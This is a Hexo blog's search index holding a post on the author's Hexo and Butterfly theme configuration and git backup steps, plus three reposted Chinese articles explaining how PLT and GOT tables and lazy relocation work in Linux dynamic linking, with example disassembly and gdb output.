<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>本Blog从默认hexo更改了哪些配置？</title>
    <url>/2024/11/12/%E6%9C%ACBlog%E4%BB%8E%E9%BB%98%E8%AE%A4hexo%E6%9B%B4%E6%94%B9%E4%BA%86%E5%93%AA%E4%BA%9B%E9%85%8D%E7%BD%AE%EF%BC%9F/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>方便迁移</p>
<p><del>其实备份的时候什么都不用记录</del><br>安装的组件会记录在<code>package.json</code>里。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="变换的组件"><a href="#变换的组件" class="headerlink" title="变换的组件"></a>变换的组件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line">npm install hexo-renderer-pug --save </span><br><span class="line">npm install hexo-renderer-stylus --save</span><br><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure>
<h2 id="加载的风格"><a href="#加载的风格" class="headerlink" title="加载的风格"></a>加载的风格</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
<p>在<code>_config.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure></p>
<h2 id="设置的调整"><a href="#设置的调整" class="headerlink" title="设置的调整"></a>设置的调整</h2><h3 id="mathjax：latex的使用"><a href="#mathjax：latex的使用" class="headerlink" title="mathjax：latex的使用"></a>mathjax：latex的使用</h3><p>基于butterfly风格的<a href="https://proton.lat/2024/06/19/Mathjax/index.html">文档</a></p>
<p>依赖于前述组件的更换<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-renderer-marked --save</span><br><span class="line">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>
<p>修改了设置</p>
<p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Choose: mathjax, katex</span></span><br><span class="line">  <span class="comment"># Leave it empty if you don&#x27;t need math</span></span><br><span class="line">  <span class="attr">use:</span> </span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="comment"># Choose: mathjax, katex</span></span><br><span class="line">  <span class="comment"># Leave it empty if you don&#x27;t need math</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">mathjax</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure></p>
<p>在<code>_config.yml</code>中添加了<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">kramed:</span></span><br><span class="line">  <span class="attr">gfm:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">pedantic:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">sanitize:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tables:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">breaks:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartLists:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">smartypants:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<h3 id="个性化的变化"><a href="#个性化的变化" class="headerlink" title="个性化的变化"></a>个性化的变化</h3><p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="comment"># Home: / || fas fa-home</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="comment"># Home: / || fas fa-home</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="string">首页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="comment">#遥远的回忆: /memories/ || fas fa-archive</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="string">分类:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">清单||fa</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>更改了网页图标、页面背景、侧边栏和基本信息的设置等。</p>
<p>在<code>/source/</code>中保存了<code>CNAME</code>文件以适应Github Pages。</p>
<h3 id="deploy的更改"><a href="#deploy的更改" class="headerlink" title="deploy的更改"></a>deploy的更改</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span></span><br><span class="line">      <span class="attr">server:</span> <span class="string">ssh://git@47.113.114.17:22535/home/git/repos/blog.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> </span><br><span class="line">      <span class="attr">server:</span> <span class="string">ssh://git@github.com/WHUphaero/WHUphaero.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<h3 id="local-search"><a href="#local-search" class="headerlink" title="local-search"></a>local-search</h3><p>根据butterfly风格的<a href="https://butterfly.js.org/posts/4aa8abbe/?highlight=mathjax">文档</a></p>
<p>基于前述<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></p>
<p>在<code>_config.butterfly.yml</code>中由<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="comment"># Choose: algolia_search / local_search / docsearch</span></span><br><span class="line">  <span class="comment"># leave it empty if you don&#x27;t need search</span></span><br><span class="line">  <span class="attr">use:</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Algolia Search</span></span><br><span class="line">  <span class="attr">algolia_search:</span></span><br><span class="line">    <span class="comment"># Number of search results per page</span></span><br><span class="line">    <span class="attr">hitsPerPage:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Local Search</span></span><br><span class="line">  <span class="attr">local_search:</span></span><br><span class="line">    <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">    <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">    <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">    <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">CDN:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Docsearch</span></span><br><span class="line">  <span class="comment"># https://docsearch.algolia.com/</span></span><br><span class="line">  <span class="attr">docsearch:</span></span><br><span class="line">    <span class="attr">appId:</span></span><br><span class="line">    <span class="attr">apiKey:</span></span><br><span class="line">    <span class="attr">indexName:</span></span><br><span class="line">    <span class="attr">option:</span></span><br></pre></td></tr></table></figure><br>变为<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="comment"># Choose: algolia_search / local_search / docsearch</span></span><br><span class="line">  <span class="comment"># leave it empty if you don&#x27;t need search</span></span><br><span class="line">  <span class="attr">use:</span> <span class="string">local_search</span></span><br><span class="line">  <span class="attr">placeholder:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Algolia Search</span></span><br><span class="line">  <span class="attr">algolia_search:</span></span><br><span class="line">    <span class="comment"># Number of search results per page</span></span><br><span class="line">    <span class="attr">hitsPerPage:</span> <span class="number">6</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Local Search</span></span><br><span class="line">  <span class="attr">local_search:</span></span><br><span class="line">    <span class="comment"># Preload the search data when the page loads.</span></span><br><span class="line">    <span class="attr">preload:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># Show top n results per article, show all results by setting to -1</span></span><br><span class="line">    <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br><span class="line">    <span class="comment"># Unescape html strings to the readable one.</span></span><br><span class="line">    <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">CDN:</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Docsearch</span></span><br><span class="line">  <span class="comment"># https://docsearch.algolia.com/</span></span><br><span class="line">  <span class="attr">docsearch:</span></span><br><span class="line">    <span class="attr">appId:</span></span><br><span class="line">    <span class="attr">apiKey:</span></span><br><span class="line">    <span class="attr">indexName:</span></span><br><span class="line">    <span class="attr">option:</span></span><br></pre></td></tr></table></figure></p>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>基于<a href="https://blog.liukuan.cc/Hexo/backup-restore/">博客</a>和<a href="https://blog.csdn.net/muzihuaner/article/details/113880440">博客</a></p>
<p>坑：（来自后一个博客的提醒）注意，如果你之前克隆过theme中的主题文件，那么应该把主题文件中的.git文件夹删掉，因为git不能嵌套上传，最好是显示隐藏文件，检查一下有没有，否则上传的时候会出错，导致你的主题文件无法上传，这样你的配置在别的电脑上就用不了了。</p>
<p>顺便讲解一下git仓库管理命令</p>
<p>初始化<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init <span class="comment">#仓库初始化</span></span><br><span class="line">git add * <span class="comment">#将文件加入暂存区</span></span><br><span class="line">git commit -m <span class="string">&quot;&#123;提示词&#125;&quot;</span> <span class="comment">#将暂存区文件给一个提示词（用于标识更新时间），转入仓库</span></span><br><span class="line">git remote add origin git@github.com/&#123;用户名&#125;/&#123;仓库名&#125;.git <span class="comment">#存储远程仓库origin以免以后重复输</span></span><br><span class="line">git push origin master <span class="comment">#我只有push master分支才能成功，因为我本地git可能默认产生的是master分支</span></span><br></pre></td></tr></table></figure></p>
<p>更新<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git add *</span><br><span class="line">git commit -m <span class="string">&quot;...&quot;</span></span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p>
<p>迁移拉取<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com/&#123;用户名&#125;/&#123;仓库名&#125;.git</span><br><span class="line">npm install</span><br><span class="line">hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0001 plt表和got表1</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0001-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://blog.csdn.net/linyt/article/details/51635768">聊聊Linux动态链接中的PLT和GOT（1）——何谓PLT与GOT</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="为什么要PLT和GOT"><a href="#为什么要PLT和GOT" class="headerlink" title="为什么要PLT和GOT"></a>为什么要PLT和GOT</h2><p>在介绍PLT和GOT出场之前，先以一个简单的例子引入两个主角，各位请看以下代码：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>编译:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Wall -g -o test.o -c test.c -m32</span><br></pre></td></tr></table></figure><br>链接:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.o -m32</span><br></pre></td></tr></table></figure><br>注意：现代Linux系统都是x86_64系统了，后面需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此在这里使用-m32选项生成i386架构指令而非x86_64架构指令。</p>
<p>经编译和链接阶段之后，test可执行文件中print_banner函数的汇编指令会是怎样的呢？我猜应该与下面的汇编类似：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080483cc &lt;print_banner&gt;:</span><br><span class="line"> 80483cc:    push %ebp</span><br><span class="line"> 80483cd:    mov  %esp, %ebp</span><br><span class="line"> 80483cf:    sub  $0x8, %esp</span><br><span class="line"> 80483d2:    sub  $0xc, %esp</span><br><span class="line"> 80483d5:    push $0x80484a8  </span><br><span class="line"> 80483da:    call **&lt;printf函数的地址&gt;**</span><br><span class="line"> 80483df:    add $0x10, %esp</span><br><span class="line"> 80483e2:    nop</span><br><span class="line"> 80483e3:    leave</span><br><span class="line"> 80483e4:    ret</span><br></pre></td></tr></table></figure><br>print_banner函数内调用了printf函数，而printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。故上述的<code>&lt;printf函数地址&gt;</code> 一项是无法填充的，只有进程运运行后，printf函数的地址才能确定。</p>
<p>那么问题来了：<strong>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</strong></p>
<p>一个简单的方法就是将指令中的<code>&lt;printf函数地址&gt;</code>修改printf函数的真正地址即可。</p>
<p>但这个方案面临两个问题：</p>
<ul>
<li>现代操作系统不允许修改代码段，只能修改数据段</li>
<li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。 </li>
</ul>
<p><strong>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</strong></p>
<p>注意：刚才谈到的回写，是指运行时修改，更专业的称谓应该是<strong>运行时重定位</strong>，与之相对应的还有<strong>链接时重定位</strong>。</p>
<p>说到这里，需要把编译链接过程再展开一下。我们知道，每个编译单元（通常是一个.c文件，比如前面例子中的test.c）都会经历编译和链接两个阶段。</p>
<p>编译阶段是将.c源代码翻译成汇编指令的中间文件，比如上述的test.c文件，经过编译之后，生成test.o中间文件。print_banner函数的汇编指令如下（使用强调内容<strong>objdump -d test.o</strong>命令即可输出）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 &lt;print_banner&gt;:</span><br><span class="line">      0:  55                   push %ebp</span><br><span class="line">      1:  89 e5                mov %esp, %ebp</span><br><span class="line">      3:  83 ec 08             sub   $0x8, %esp</span><br><span class="line">      6:  c7 04 24 00 00 00 00 movl  $0x0, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+0xe&gt;</span><br><span class="line">     12:  c9                   leave</span><br><span class="line">     13:  c3                   ret</span><br></pre></td></tr></table></figure>
<p>是否注意到call指令的操作数是fc ff ff ff，翻译成16进制数是0xfffffffc（x86架构是小端的字节序），看成有符号是-4。这里应该存放printf函数的地址，但由于编译阶段无法知道printf函数的地址，所以预先放一个-4在这里，然后用重定位项来描述：<strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式。</strong></p>
<p>这个过程称为<strong>链接时重定位</strong>，与刚才提到的运行时重定位工作原理完全一样，只是修正时机不同。</p>
<p><strong>链接阶段</strong>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段主要完成以下事情：</p>
<ul>
<li>各个中间文之间的同名section合并</li>
<li>对代码段，数据段以及各符号进行地址分配</li>
<li>链接时重定位修正</li>
</ul>
<p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令</strong>。</p>
<p>那么问题来了：<strong>编译阶段怎么知道printf函数是在glibc运行库的，而不是定义在其它.o中</strong></p>
<p>答案往往令人失望：<strong>编译器是无法知道的</strong></p>
<p>那么编译器只能老老实实地生成调用printf的汇编指令，printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p>
<p>根据前面讨论，运行时重定位是无法修改代码段的，只能将printf重定位到数据段。那在编译阶段就已生成好的call指令，怎么感知这个已重定位好的数据段内容呢？</p>
<p>答案是：<strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。</strong></p>
<p>链接器生成额外的伪代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址：</span><br><span class="line">　　这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure>
<p>链接阶段发现printf定义在动态库时，链接器生成一段小代码print_stub，然后printf_stub地址取代原来的printf。因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p>
<h2 id="动态链接姐妹花PLT与GOT"><a href="#动态链接姐妹花PLT与GOT" class="headerlink" title="动态链接姐妹花PLT与GOT"></a>动态链接姐妹花PLT与GOT</h2><p>前面由一个简单的例子说明动态链接需要考虑的各种因素，但实际总结起来说两点：</p>
<ul>
<li>需要存放外部函数的数据段</li>
<li>获取数据段存放函数地址的一小段额外代码</li>
</ul>
<p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p>
<p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<strong>重局偏移表（GOT, Global Offset Table）</strong>，而那个额外代码段表，称为<strong>程序链接表（PLT，Procedure Link Table）</strong>。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏。</strong></p>
<p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT/GOT是如何运行的。</p>
<p>假设最开始的示例代码test.c增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file）是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p>
<p>我简单画了PLT和GOT雏形图，供各位参考。</p>
<p><img src="/image/post/transship/0001/1.jpg" alt=""></p>
<p>当然这个原理图并不是Linux下的PLT/GOT真实过程，Linux下的PLT/GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT/GOT是如何穿针引线的。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0002 plt表和got表2</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0002-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A82/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51636753">聊聊Linux动态链接中的PLT和GOT（２）——延迟重定位</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>在前文（转载1）中，介绍解决动态库函数调用使用GOT表技术，然后PLT从GOT中获取地址并完成调用。这个前提是GOT必须在PLT执行之前，所有函数都已完成运行时重定位。</p>
<p>然而在Linux的世界里面，几乎所有可能的事情，都尽可能地延迟推后，直至无法退避时，才做最后的修正工作。典型的案例有：</p>
<ol>
<li>fork之后父子进程内存的写时拷贝机制</li>
<li>Linux用户态内存空间分配与物理内存分配机制</li>
<li>C++库的string类写时拷贝机制</li>
</ol>
<p>当然，也少不了动态链中的延迟重定位机制。</p>
<h2 id="延迟重定位"><a href="#延迟重定位" class="headerlink" title="延迟重定位"></a>延迟重定位</h2><p>如果可执行文件调用的动态库函数很多时，那在进程初始化时都对这些函数做地址解析和重定位工作，大大增加进程的启动时间。所以Linux提出延迟重定位机制，只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
<p>进程启动时，先不对GOT表项做重定位，等到要调用该函数时才做重定位工作。要实现这个机制必须要有一个状态描述该GOT表项是否已完重定位。</p>
<p>一个显而易见的方案是在GOT中增加一个状态位，描述一个GOT表项是否已完成重定位，那么每个函数就有两个GOT表项了。相应的PLT伪代码如何：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">printf</span>@got[<span class="number">0</span>] ！= RELOCATED) &#123; <span class="comment">// 如果没完成重定位</span></span><br><span class="line">        <span class="comment">//调用重定位函数</span></span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">1</span>] = 地址解析发现的<span class="built_in">printf</span>地址;</span><br><span class="line">        <span class="built_in">printf</span>@got[<span class="number">0</span>] = RELOCATED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    jmp *<span class="built_in">printf</span>@got[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方案每个函数使用两个GOT表项，占用内存明显增长了一倍。但仔细观察GOT表项中的状态位和真实地址项，这两项在任何时候都不会同时使用，那么这两个变量能复用一个GOT项来实现呢？答案是可以的，Linux动态链接器就使用类似的巧妙方案，将这两个GOT表项合二为一。</p>
<p>具体怎么做呢？很简单，先将上面的代码倒过来写：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="built_in">printf</span>@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *<span class="built_in">printf</span>@got            <span class="comment">// 链接器将printf@got填成下一语句lookup_printf的地址</span></span><br><span class="line"></span><br><span class="line">lookup_printf:</span><br><span class="line">        调用重定位函数查找<span class="built_in">printf</span>地址，并写到<span class="built_in">printf</span>@got</span><br><span class="line"></span><br><span class="line">        <span class="keyword">goto</span> address_good;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>在链接成可执行文件test时，链接器将printf@got表项的内容填写lookup_printf标签的地址。</strong></p>
<p>也即是程序第一次调用printf是时，通过printf@got表项引导到查找printf的plt指令的后半部分。在后半部分中跳到动态链接器中将printf址解析出来，并重定位回printf@got项内。</p>
<p>那么神奇的作用来，第二次调用printf时，通过printf@got直接跳到printf函数执行了。</p>
<p>下面是test可执行文件，通过objdump -d test &gt; test.asm命令反编译之后生成汇编代码，可以看到整个跳转过程。</p>
<p>下面是test.asm文件中与PLT/GOT相关的部分，并对一些容易引起误解的地方做了修改。</p>
<p><img src="/image/post/transship/0002/1.jpg" alt=""></p>
<p>我将第一项plt表修改成<code>&lt;common@plt&gt;</code>项了，objdump -d输出结果会使用错误的符号名。那是因为该项是没有符号的，而objdump输出时，给它找了一个地址接近符号，所以会显示错误的符号名，为了避免引起误解，直接删掉。</p>
<p>每个plt指令中的jmp *0xf80496xx 都是访问相应的got项。在函数第一次调用之前，这些got项的内容都是链接器生成的，它的值指向对应plt中jmp的下一条指令。</p>
<p>下面是使用gdb命令，查看test可执行文中函数的got表内容，如下：</p>
<p><img src="/image/post/transship/0002/1.jpg" alt=""></p>
<p>将两张图对照一下，就可以看到前面说到的规律。</p>
<p>最后所有plt都跳转到common@plt中执行，这是动态链接做符号解析和重定位的公共入口，而不是每个plt表都有重复的一份指令。为了减少PLT指令条数，Linux提炼成了公共函数。从这一点来看，Linux也是拼了。</p>
]]></content>
      <categories>
        <category>转载</category>
        <category>ctf</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>glibc</tag>
        <tag>plt</tag>
        <tag>got</tag>
        <tag>动态链接</tag>
        <tag>重定位</tag>
      </tags>
  </entry>
  <entry>
    <title>转载0003 plt表和got表3</title>
    <url>/2024/11/13/transship/%E8%BD%AC%E8%BD%BD0003-plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A83/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是转载于CSDN的文章，仅用作存储，遵循 CC 4.0 BY-SA版权协议。</p>
<p><a href="https://linyt.blog.csdn.net/article/details/51637832">聊聊Linux动态链接中的PLT和GOT（３）——公共GOT表项</a></p>
<p>原作者：<a href="https://linyt.blog.csdn.net/">海枫</a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前文（转载2），提到所有动态库函数的plt指令最终都跳进公共plt执行，那么公共plt指令里面的地址是什么鬼？</p>
<p>把test可执行文的共公plt贴出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080482a0 &lt;common@plt&gt;:</span><br><span class="line"> 80482a0:  pushl 0x80496f0</span><br><span class="line"> 80482a6:  jmp *0x80496f4</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>
<p>第一句，pushl 0x80496f0，是将地址压到栈上，也即向最终调用的函数传递参数。<br>第二句，jmp *0x80496f4，这是跳到最终的函数去执行，不过猜猜就能想到，这是跳到能解析动态库函数地址的代码里面执行。</p>
<p><strong>0x80496f4</strong>里面住着是何方圣呢？下面使用gdb调试器将它请出来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gdb -q ./test</span><br><span class="line">...</span><br><span class="line">(gdb)x/xw 0x80496f4</span><br><span class="line">0x80496f4 &lt;_GLOBAL_OFFSET_TABLE_+8&gt;:    0x00000000</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x80483f3</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/ivan/test/test/test</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x80483f3 in main ()</span><br><span class="line">(gdb) x/xw 0x80496f4</span><br><span class="line">0x80496f4 &lt;_GLOBAL_OFFSET_TABLE_+8&gt;:    0xf7ff06a0</span><br></pre></td></tr></table></figure>
<p>从调试过程可以发现，0x80496f4属于GOT表中的一项，进程还没有运行时它的值是0x00000000，当进程运行起来后，它的值变成了0xf7ff06a0。如果做更进一步的调试会发现这个地址位于动态链接器内，对应的函数是<strong>_dl_runtime_resolve</strong>。</p>
<p>嗯，是不是想到了什么呢。所有动态库函数在第一次调用时，都是通过XXX@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve调用关系做地址解析和重定位的。</p>
